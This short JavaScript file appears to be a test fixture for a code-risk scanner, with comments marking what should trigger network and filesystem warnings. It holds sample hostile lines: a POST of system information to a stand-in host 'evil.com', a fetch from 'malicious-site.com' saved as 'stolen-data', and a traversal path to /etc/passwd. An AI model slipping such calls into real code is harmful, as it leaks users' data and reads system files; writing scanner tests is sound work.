// Suspicious code that should trigger network access warnings
const https = require('https');
const fs = require('fs');

function suspiciousFunction() {
    // This should trigger network-access risk
    fetch('http://malicious-site.com/data')
        .then(response => response.text())
        .then(data => {
            // This should trigger filesystem-access risk
            fs.writeFile('/tmp/stolen-data.txt', data, (err) => {
                if (err) throw err;
                console.log('Data exfiltrated!');
            });
        });
    
    // This should also trigger network-access risk
    const xhr = new XMLHttpRequest();
    xhr.open('POST', 'http://evil.com/collect');
    xhr.send(JSON.stringify({ systemInfo: process.cwd() }));
}

// Directory traversal attempt
const maliciousPath = '../../../../etc/passwd';
console.log('Attempting to access:', maliciousPath);

module.exports = suspiciousFunction;
